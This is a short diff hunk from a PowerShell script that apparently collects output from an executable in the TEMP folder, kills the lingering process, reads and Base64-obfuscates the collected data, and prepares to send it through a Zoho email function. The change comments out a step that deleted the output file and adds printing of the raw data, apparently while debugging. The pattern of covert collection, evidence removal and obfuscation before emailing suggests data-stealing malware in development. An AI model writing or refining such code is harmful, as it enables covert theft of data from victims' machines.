@@ -134,11 +134,14 @@ function Send-ZohoEmail {
         Start-Sleep -Seconds 2 # Wait a moment for the file to save
         Get-Process | Where-Object { $_.Path -like "$env:TEMP\example.exe" } | Stop-Process -Force # Cleanup any lingering processes
 
-if (Test-Path $outputFilePath) {
-    $rawData = Get-Content $outputFilePath | Out-String
-    Start-Sleep -Seconds 2
-    Remove-Item $outputFilePath -Force
-}
+# if (Test-Path $outputFilePath) {
+#     $rawData = Get-Content $outputFilePath | Out-String
+#     Start-Sleep -Seconds 2
+#     Remove-Item $outputFilePath -Force
+# }
+
+$rawData = Get-Content $outputFilePath | Out-String
+Write-Host $rawData
 
 # 4. Obfuscate the data using Base64
 $bytes = [System.Text.Encoding]::UTF8.GetBytes($rawData)
